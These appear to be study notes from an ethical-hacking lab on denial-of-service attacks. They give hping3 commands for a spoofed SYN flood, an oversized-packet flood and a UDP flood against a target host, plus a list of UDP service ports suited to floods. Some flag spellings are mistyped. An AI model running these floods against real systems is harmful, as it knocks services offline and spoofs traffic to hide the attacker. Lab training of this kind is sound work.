# 10 - DoS

## Module 10 - Denial-of-Service

### **Lab1 - Task2: Perform a DoS Attack on a Target Host using hping3**

* **Target:**
  * Wireshark-\&gt;Ethernet
* **Attacker**
  * **hping3 -S \[Target IP] -a \[Spoofable IP] -p 22 -flood**
    * **-S: Set the SYN flag**
    * **-a: Spoof the IP address**
    * **-p: Specify the destination port**
    * **--flood: Send a huge number of packets**
* **Target**
  * Check wireshark
* **Attacker (Perform PoD)**
  * **hping3 -d 65538 -S -p 21 –flood \[Target IP]**
    * **-d: Specify data size**
    * **-S: Set the SYN flag**
* **Attacker (Perform UDP application layer flood attack)**
  * nmap -p 139 10.10.10.19 (check service)
  * **hping3 -2 -p 139 –flood \[IP]**
    * **-2: Specify UDP mode**
* **Other UDP-based applications and their ports**
  * CharGen UDP Port 19
  * SNMPv2 UDP Port 161
  * QOTD UDP Port 17
  * RPC UDP Port 135
  * SSDP UDP Port 1900
  * CLDAP UDP Port 389
  * TFTP UDP Port 69
  * NetBIOS UDP Port 137,138,139
  * NTP UDP Port 123
  * Quake Network Protocol UDP Port 26000
  * VoIP UDP Port 5060
